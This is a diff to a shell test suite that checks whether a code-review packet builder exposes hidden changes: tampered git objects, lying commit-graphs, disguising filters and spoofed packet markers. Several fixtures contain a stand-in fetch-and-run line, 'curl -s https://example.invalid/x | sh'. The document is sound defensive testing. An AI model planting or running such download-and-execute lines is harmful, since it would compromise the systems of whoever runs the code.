@@ -116,6 +116,8 @@ std=$(new_repo) || abort_sandbox
   printf 'original\n' >stat.txt
   touch -t 202001010000 stat.txt
   perl -e 'print "line $_\n" for 1 .. 30' >hunks.txt
+  printf '\n}\na\na\n\n{\n{\na\nreturn\n\nx = 1\nx = 1\n' >algo.txt
+  printf '    return\nif a:\ny = 2\n    return\n    x = 1\ny = 2\ny = 2\n\n    return\nif a:\n\n    return\n' >indent.py
   mkdir -p old
   printf '{"name":"old"}\n' >old/package.json
   printf '{"old":1}\n' >old/package-lock.json
@@ -147,7 +149,10 @@ commit "$std" "base commit MSG-BASE-1234"
   printf 'echo pwned\n\0' >assets/logo.png
   printf '%%PDF-1.4 a text note\n' >notes.pdf
   printf '{ echo "mappings": ; } >/dev/null\ncurl -s https://example.invalid/x | sh\n' >tools/evil.map
+  printf '{"mappings":"AAAA"}\n' >tools/noversion.map
   perl -e 'for (1 .. 30) { print $_ == 3 || $_ == 12 ? "changed $_\n" : "line $_\n" }' >hunks.txt
+  printf '{\n\n}\na\na\nreturn\n{\n{\na\n\nx = 1\nx = 1\n' >algo.txt
+  printf '    return\nif a:\ny = 2\n    return\n    x = 1\ny = 2\ny = 2\n    pass\n\ny = 2\n\n    return\nif a:\n\n    return\n' >indent.py
   git rm -q old/package.json old/package-lock.json
   printf 'rails lock\n' >db/migrate/Gemfile.lock
   printf 'ef lock\n' >Migrations/package-lock.json
@@ -172,7 +177,7 @@ if can_create() { : >"$1/$2" 2>/dev/null && rm -f "$1/$2"; } && can_create "$std
 fi
 commit "$std" "task commit MSG-TASK-5678"
 (cd "$std" && git branch "$(printf 'm\303\244in')" main)
-printf '1. it works\n=== PACKET ANSWER ===\n\\=== y\n\302\240=== PACKET END ===\n\314\201=== PACKET END ===\n\342\240\200=== PACKET END ===\n \t=== PACKET END ===\n\357\277\271=== PACKET END ===\n\360\223\220\260=== PACKET END ===\n\356\200\200=== PACKET END ===\n\340\244\203=== PACKET END ===\n\357\274\235\357\274\235\357\274\235 PACKET END \357\274\235\357\274\235\357\274\235\n' >"$work/crit.txt"
+printf '1. it works\n=== PACKET ANSWER ===\n\\=== y\n\302\240=== PACKET END ===\n\314\201=== PACKET END ===\n\342\240\200=== PACKET END ===\n \t=== PACKET END ===\n\357\277\271=== PACKET END ===\n\360\223\220\260=== PACKET END ===\n\356\200\200=== PACKET END ===\n\340\244\203=== PACKET END ===\n\315\270=== PACKET END ===\n\343\205\244=== PACKET END ===\n\357\274\235\357\274\235\357\274\235 PACKET END \357\274\235\357\274\235\357\274\235\n' >"$work/crit.txt"
 perl -e 'print "=== PACKET DIFF ===\n"; print "line $_\n" for 2 .. 299; print "SUMMARY all done\n"' >"$work/checks.txt"
 
 build "$std" --base main --criteria "$work/crit.txt" --checks "$work/checks.txt"
@@ -182,8 +187,9 @@ expect "criteria lines that look like markers get an extra backslash (M113)" 0 '
 expect "a marker after a no-break space, a combining mark, a blank braille sign or blanks gets a backslash too" 0 \
   "$(printf '\302\240')\\=== PACKET END ===" "$(printf '\314\201')\\=== PACKET END ===" \
   "$(printf '\342\240\200')\\=== PACKET END ===" "$(printf ' \t')\\=== PACKET END ===" "$(printf '\340\244\203')\\=== PACKET END ==="
-expect "format, private-use and invisible characters before a marker are escaped, so the line shows as content" 0 \
-  '\u{FFF9}=== PACKET END ===' '\u{13430}=== PACKET END ===' '\u{E000}=== PACKET END ==='
+expect "format, private-use, unassigned and invisible characters before a marker are escaped, so the line shows as content" 0 \
+  '\u{FFF9}=== PACKET END ===' '\u{13430}=== PACKET END ===' '\u{E000}=== PACKET END ===' '\u{0378}=== PACKET END ===' \
+  '\u{3164}=== PACKET END ==='
 expect "a marker drawn with look-alike signs stays content: only lines with the token are markers" 0 \
   "$(printf '\357\274\235\357\274\235\357\274\235') PACKET END" "Only lines with the token"
 expect "the checklist comes from the merge base, escaped (M032, M113)" 0 'check A' '\=== PACKET END ===' '\\=== x' \
@@ -210,7 +216,8 @@ expect "lockfiles in migrate, Migrations and moved out of migrations are kept (M
   'FILE R migrations/yarn.lock -> vendor/yarn.lock'
 expect "a lockfile name with no manifest, a .map that is not a source map and a .png without its signature are shown" 0 \
   'FILE A tools/Cargo.lock' '+echo pwned' 'FILE A tools/setup.map' '+map upgrade' 'FILE A assets/logo.png' '+\x00' \
-  'FILE A notes.pdf' '+%PDF-1.4 a text note' 'FILE A tools/evil.map' '+curl -s https://example.invalid/x | sh'
+  'FILE A notes.pdf' '+%PDF-1.4 a text note' 'FILE A tools/evil.map' '+curl -s https://example.invalid/x | sh' \
+  'FILE A tools/noversion.map' '+{"mappings":"AAAA"}'
 expect "a deleted lockfile next to its deleted manifest is left out; the manifest is shown" 0 \
   'D old/package-lock.json (left out of the diff: lockfile' 'FILE D old/package.json'
 expect "a real binary is one line; a NUL byte does not hide a script; a text file named .png is shown" 0 \
@@ -250,6 +257,18 @@ else
   skip "a file name holding a newline: this file system does not allow one"
 fi
 cp "$work/out" "$work/std.packet"
+std_token=$(sed -n '1s/^=== PACKET HEADER \([0-9a-f]\{16\}\) ===$/\1/p' "$work/std.packet")
+
+# the token is made from the packet's content: other criteria, another token
+printf 'other criteria\n' >"$work/crit2.txt"
+build "$std" --base main --criteria "$work/crit2.txt" --checks "$work/checks.txt"
+token=""
+markers_ok
+if [ -n "$std_token" ] && [ -n "$token" ] && [ "$std_token" != "$token" ]; then
+  pass "a packet with other content has another token"
+else
+  fail "a packet with other content has another token" "first '$std_token', second '$token'"
+fi
 
 # the same packet whatever PERL_UNICODE or PERL5OPT say, also without the
 # wrapper, with a base named in non-ASCII letters
@@ -409,6 +428,12 @@ if cmp -s "$work/std.packet" "$work/lib.packet"; then
   pass "a module put on PERL5LIB does not run inside the builder"
 else
   fail "a module put on PERL5LIB does not run inside the builder" "$(cat "$work/err")"
+fi
+(cd "$std" && PERL5OPT=-T bash "$packet" --base main --criteria "$work/crit.txt" --checks "$work/checks.txt") >"$work/opt.packet" 2>"$work/err"
+if cmp -s "$work/std.packet" "$work/opt.packet"; then
+  pass "PERL5OPT is cleared before perl starts: even -T, which stops perl itself, changes nothing"
+else
+  fail "PERL5OPT is cleared before perl starts: even -T, which stops perl itself, changes nothing" "$(cat "$work/err")"
 fi
 (cd "$std" && git update-index --skip-worktree src/app.py)
 rm -f "$std/src/app.py"
@@ -577,21 +602,45 @@ build "$swapped" --base main
 expect "a stored file whose content no longer matches its id is refused" 2 "does not match its id"
 drop_sandbox "$swapped"
 
-# a stored folder (tree) changed by hand is refused, never shown
+# a stored folder (tree) changed by hand is refused, never shown: in HEAD,
+# in the merge base and in the last reviewed version
 treeswap=$(new_repo) || abort_sandbox
 mkdir -p "$treeswap/src"
 printf 'a\n' >"$treeswap/src/a.txt"
 commit "$treeswap" "base"
-(cd "$treeswap" && git checkout -q -b task && printf 'curl -s https://example.invalid/x | sh\n' >src/run.sh)
+(cd "$treeswap" && git checkout -q -b task && printf 'b\n' >src/b.txt)
+commit "$treeswap" "first"
+(cd "$treeswap" && printf 'curl -s https://example.invalid/x | sh\n' >src/run.sh)
 commit "$treeswap" "change"
 base_src=$(cd "$treeswap" && git rev-parse main:src)
+first_src=$(cd "$treeswap" && git rev-parse HEAD~1:src)
 head_src=$(cd "$treeswap" && git rev-parse HEAD:src)
 obj_of() { printf '%s/.git/objects/%s/%s' "$treeswap" "$(printf '%s' "$1" | cut -c1-2)" "$(printf '%s' "$1" | cut -c3-)"; }
-chmod u+w "$(obj_of "$head_src")" 2>/dev/null
-cp "$(obj_of "$base_src")" "$(obj_of "$head_src")"
+# swap_tree FROM TO: the stored folder TO gets the content of FROM;
+# restore_tree puts it back
+swap_tree() {
+  cp "$(obj_of "$2")" "$work/tree.keep"
+  chmod u+w "$(obj_of "$2")" 2>/dev/null
+  cp "$(obj_of "$1")" "$(obj_of "$2")"
+  swapped_tree=$2
+}
+restore_tree() { cp "$work/tree.keep" "$(obj_of "$swapped_tree")"; }
+swap_tree "$base_src" "$head_src"
 (cd "$treeswap" && git read-tree HEAD 2>/dev/null && git checkout-index -f -a 2>/dev/null)
 build "$treeswap" --base main
-expect "a stored folder whose content no longer matches its id is refused" 2 "does not match its id"
+expect "a stored folder of HEAD whose content no longer matches its id is refused" 2 "does not match its id"
+restore_tree
+(cd "$treeswap" && git read-tree HEAD && git checkout-index -f -a)
+swap_tree "$head_src" "$base_src"
+build "$treeswap" --base main
+expect "a stored folder of the merge base whose content no longer matches its id is refused" 2 "does not match its id"
+restore_tree
+swap_tree "$head_src" "$first_src"
+build "$treeswap" --base main --since HEAD~1
+expect "a stored folder of the last reviewed version whose content no longer matches its id is refused" 2 "does not match its id"
+restore_tree
+build "$treeswap" --base main --since HEAD~1
+expect "with every stored folder put back, the same packet is built" 0 "FILE A src/run.sh"
 drop_sandbox "$treeswap"
 
 # folder names that read as pathspec magic are plain names
@@ -610,6 +659,33 @@ else
 fi
 drop_sandbox "$colon"
 
+# a folder named like a manifest is no manifest, and a file named docs holds
+# no checklist
+odd=$(new_repo) || abort_sandbox
+printf 'not a folder\n' >"$odd/docs"
+commit "$odd" "base"
+(cd "$odd" && git checkout -q -b task && mkdir -p lib/package.json && printf 'keep\n' >lib/package.json/keep &&
+  printf 'echo evil\n' >lib/yarn.lock)
+commit "$odd" "change"
+build "$odd" --base main
+expect "a lockfile next to a folder named like its manifest is shown" 0 'FILE A lib/yarn.lock' '+echo evil'
+expect "a file named docs at the merge base means there is no checklist" 0 "There is no incident checklist"
+drop_sandbox "$odd"
+
+# a repository with SHA-256 ids: stored files and folders are checked in
+# that hash
+sha=$(new_sandbox_dir) || abort_sandbox
+if (cd "$sha" && git init -q --object-format=sha256) 2>/dev/null; then
+  (cd "$sha" && git symbolic-ref HEAD refs/heads/main && git config user.name Test && git config user.email test@example.invalid &&
+    git config commit.gpgsign false && mkdir -p src && printf 'base\n' >src/a.txt && git add -A && git commit -qm base &&
+    git checkout -q -b task && printf 'changed\n' >src/a.txt && git commit -qam change)
+  build "$sha" --base main
+  expect "a repository with SHA-256 ids gives a packet" 0 "FILE M src/a.txt" "+changed"
+else
+  skip "SHA-256 ids: this git cannot make such a repository"
+fi
+drop_sandbox "$sha"
+
 # a commit-graph file that lies about HEAD's tree changes nothing
 graph=$(new_repo) || abort_sandbox
 printf 'base\n' >"$graph/a.txt"
@@ -619,11 +695,15 @@ commit "$graph" "base"
   git commit-graph write --reachable >/dev/null 2>&1)
 real_tree=$(cd "$graph" && git rev-parse 'task^{tree}')
 decoy_tree=$(cd "$graph" && git rev-parse 'decoy^{tree}')
-cg="$graph/.git/objects/info/commit-graph"
-if [ -f "$cg" ] && perl -e '
+# patch_graph REPO FROM TO: the repo's commit-graph file names tree TO where
+# it named tree FROM; fails when there is no such file or FROM is not in it once
+patch_graph() {
+  [ -f "$1/.git/objects/info/commit-graph" ] && perl -e '
     my ($f, $from, $to) = @ARGV; open my $h, "<:raw", $f or exit 1; local $/; my $t = <$h>; close $h;
     my ($a, $b) = (pack("H*", $from), pack("H*", $to)); my $n = () = $t =~ /\Q$a\E/g; exit 1 unless $n == 1;
-    $t =~ s/\Q$a\E/$b/; chmod 0644, $f; open $h, ">:raw", $f or exit 1; print $h $t; close $h' "$cg" "$real_tree" "$decoy_tree"; then
+    $t =~ s/\Q$a\E/$b/; chmod 0644, $f; open $h, ">:raw", $f or exit 1; print $h $t; close $h' "$1/.git/objects/info/commit-graph" "$2" "$3"
+}
+if patch_graph "$graph" "$real_tree" "$decoy_tree"; then
   (cd "$graph" && git read-tree "$decoy_tree" && git checkout-index -f -a)
   build "$graph" --base main
   if [ "$code" -ne 0 ] && [ -z "$out" ]; then
@@ -633,6 +713,18 @@ if [ -f "$cg" ] && perl -e '
   fi
 else
   skip "a lying commit-graph: git wrote no commit-graph here"
+fi
+drop_sandbox "$graph"
+graph=$(new_repo) || abort_sandbox
+printf 'base\n' >"$graph/a.txt"
+commit "$graph" "base"
+(cd "$graph" && git checkout -q -b task && printf 'real change\n' >b.txt && git add b.txt && git commit -qm change &&
+  git commit-graph write --reachable >/dev/null 2>&1)
+if patch_graph "$graph" "$(cd "$graph" && git rev-parse 'main^{tree}')" "$(cd "$graph" && git rev-parse 'task^{tree}')"; then
+  build "$graph" --base main
+  expect "a commit-graph that lies about the merge base's tree hides nothing" 0 'FILE A b.txt' '+real change'
+else
+  skip "a commit-graph that lies about the merge base: git wrote no commit-graph here"
 fi
 drop_sandbox "$graph"
 
@@ -697,7 +789,8 @@ esac
 build "$eol" --base main
 expect "a clean CRLF working copy under core.autocrlf=true is not refused" 0 "FILE M plain.txt"
 (cd "$eol" && git config core.autocrlf false && git checkout -q -- plain.txt)
-printf '#!/bin/sh\ncat >/dev/null\ngit cat-file blob HEAD:hidden.txt\n' >"$eol/.git/clean-hide.sh"
+# shellcheck disable=SC2016 # $1 is for the script being written
+printf '#!/bin/sh\ncat >/dev/null\ngit cat-file blob "HEAD:$1"\n' >"$eol/.git/clean-hide.sh"
 # shellcheck disable=SC2016 # $Id$ is meant literally
 (cd "$eol" && printf 'var v = "$Id$"; fetch(1);\n' >vendor.js && git add vendor.js && git commit -qm vendor &&
   printf 'vendor.js ident\n' >.git/info/attributes && printf 'var v = "$Id: "; /* $"; fetch(1);\n' >vendor.js && git add vendor.js)
@@ -708,49 +801,76 @@ else
   skip "a file under a local ident attribute: git status sees the edit here"
 fi
 (cd "$eol" && rm -f .git/info/attributes vendor.js && git checkout -q HEAD -- vendor.js)
-(cd "$eol" && git config filter.hide.clean "sh .git/clean-hide.sh" && printf 'hidden.txt filter=hide\n' >>.git/info/attributes &&
+(cd "$eol" && git config filter.hide.clean "sh .git/clean-hide.sh %f" && printf 'hidden.txt filter=hide\n' >>.git/info/attributes &&
   printf 'benign code\n' >hidden.txt && git add hidden.txt)
 build "$eol" --base main
 expect "a file that a local filter makes look committed is refused" 1 "the working copy of hidden.txt is not what was committed"
-(cd "$eol" && git config --unset filter.hide.clean && rm -f .git/info/attributes && git checkout -q -- hidden.txt)
+(cd "$eol" && git config --unset filter.hide.clean && rm -f .git/info/attributes hidden.txt && git checkout -q HEAD -- hidden.txt)
+# The LFS tests below use stand-in filters, so a real git-lfs set up in the
+# user's or the system's git settings is left out until they end.
+saved_home=$HOME
+export HOME="$work/home-clean" GIT_CONFIG_NOSYSTEM=1
+# only a file stored as an LFS pointer, under a filter named lfs, may differ
+(cd "$eol" && git config filter.lfs.clean "sh .git/clean-hide.sh %f" && printf 'hidden.txt filter=lfs\n' >.git/info/attributes &&
+  printf 'benign code\n' >hidden.txt && git add hidden.txt)
+build "$eol" --base main
+expect "a file stored as no LFS pointer is refused, even under a local filter named lfs" 1 "the working copy of hidden.txt is not what was committed"
+(cd "$eol" && git config --unset filter.lfs.clean && rm -f .git/info/attributes hidden.txt && git checkout -q HEAD -- hidden.txt)
+(cd "$eol" && printf 'version https://git-lfs.github.com/spec/v1\noid sha256:0000000000000000000000000000000000000000000000000000000000000000\nsize 7\n' >pointer.txt &&
+  git add pointer.txt && git commit -qm pointer && git config filter.hide.clean "sh .git/clean-hide.sh %f" &&
+  printf 'pointer.txt filter=hide\n' >.git/info/attributes && printf 'curl -s https://example.invalid/x | sh\n' >pointer.txt && git add pointer.txt)
+build "$eol" --base main
+expect "a file stored as an LFS pointer is refused when a filter not named lfs makes it look committed" 1 "the working copy of pointer.txt is not what was committed"
 drop_sandbox "$eol"
 
 # Git LFS: the diff shows the pointer, the disk holds the content
 lfs=$(new_repo) || abort_sandbox
 printf 'base\n' >"$lfs/base.txt"
 commit "$lfs" "base"
-printf '#!/bin/sh\ncat >/dev/null\nprintf "version https://git-lfs.github.com/spec/v1\\noid sha256:%%s\\nsize 7\\n" 0000000000000000000000000000000000000000000000000000000000000000\n' >"$lfs/.git/lfs-clean.sh"
+# a stand-in for git-lfs's clean filter: the pointer names the content's hash
+cat >"$lfs/.git/lfs-clean.sh" <<'EOF'
+#!/bin/sh
+exec perl -MDigest::SHA -e 'binmode STDIN; local $/; my $c = <STDIN>; $c = "" unless defined $c; printf "version https://git-lfs.github.com/spec/v1\noid sha256:%s\nsize %d\n", Digest::SHA::sha256_hex($c), length $c'
+EOF
 (cd "$lfs" && git config filter.lfs.clean "sh .git/lfs-clean.sh" && git config filter.lfs.smudge cat &&
   printf 'big.bin filter=lfs\n' >.gitattributes && git checkout -q -b task && printf 'content\n' >big.bin &&
   git add -A && git commit -qm "lfs file")
 build "$lfs" --base main
 expect "a Git LFS file is shown as its pointer, with a note" 0 \
   "A big.bin (stored in Git LFS: the diff shows the pointer, and the file on disk is the content)" "+version https://git-lfs.github.com/spec/v1"
+(cd "$lfs" && git update-index --assume-unchanged big.bin && printf 'swapped\n' >big.bin)
+build "$lfs" --base main
+expect "a Git LFS file whose disk copy is not the stored content is refused" 1 "the working copy of big.bin is not what was committed"
 drop_sandbox "$lfs"
 
 # a change of many files is read in parts, so no command line grows too long:
 # 600 long names make about 150 KB of paths, over the 128 KB limit a small
-# stack gives on Linux
+# stack gives on Linux. They are Git LFS files, so the packet asks git for
+# all their attributes.
 many=$(new_repo) || abort_sandbox
 printf 'base\n' >"$many/base.txt"
 commit "$many" "base"
-(cd "$many" && git checkout -q -b task && mkdir -p d && perl -e 'my $n = "n" x 230; for (1 .. 600) { open my $f, ">", sprintf("d/%s-%03d.txt", $n, $_) or die; print $f "n $_\n" }')
+printf '#!/bin/sh\ncat >/dev/null\nprintf "version https://git-lfs.github.com/spec/v1\\noid sha256:%%s\\nsize 7\\n" 0000000000000000000000000000000000000000000000000000000000000000\n' >"$many/.git/lfs-clean.sh"
+(cd "$many" && git config filter.lfs.clean "sh .git/lfs-clean.sh" && printf 'd/* filter=lfs\n' >.gitattributes &&
+  git checkout -q -b task && mkdir -p d && perl -e 'my $n = "n" x 230; for (1 .. 600) { open my $f, ">", sprintf("d/%s-%03d.txt", $n, $_) or die; print $f "n $_\n" }')
 commit "$many" "many files"
 if (ulimit -s 256) 2>/dev/null; then
   (cd "$many" && ulimit -s 256 && bash "$packet" --base main) >"$work/out" 2>"$work/err"
   code=$?
   out=$(cat "$work/out")
   err=$(cat "$work/err")
-  files_listed=$(printf '%s\n' "$out" | grep -c '^A d/nnn')
+  files_listed=$(printf '%s\n' "$out" | grep -c '^A d/nnn.*stored in Git LFS')
   if [ "$code" -eq 0 ] && [ "$files_listed" -eq 600 ]; then
-    pass "a change of 600 long file names is read in parts and lists every file"
+    pass "a change of 600 long file names in Git LFS is read in parts and lists every file"
   else
-    fail "a change of 600 long file names is read in parts and lists every file: exit $code, $files_listed listed" "$err"
+    fail "a change of 600 long file names in Git LFS is read in parts and lists every file: exit $code, $files_listed listed" "$err"
   fi
 else
   skip "many long file names: the stack limit cannot be lowered here"
 fi
 drop_sandbox "$many"
+export HOME="$saved_home"
+unset GIT_CONFIG_NOSYSTEM
 
 for d in "$std" "$rounds" "$empty" "$subs" "$broken" "$work"; do drop_sandbox "$d"; done
 echo "tests: review packet: $tests_pass passed, $tests_fail failed, $tests_skip skipped"
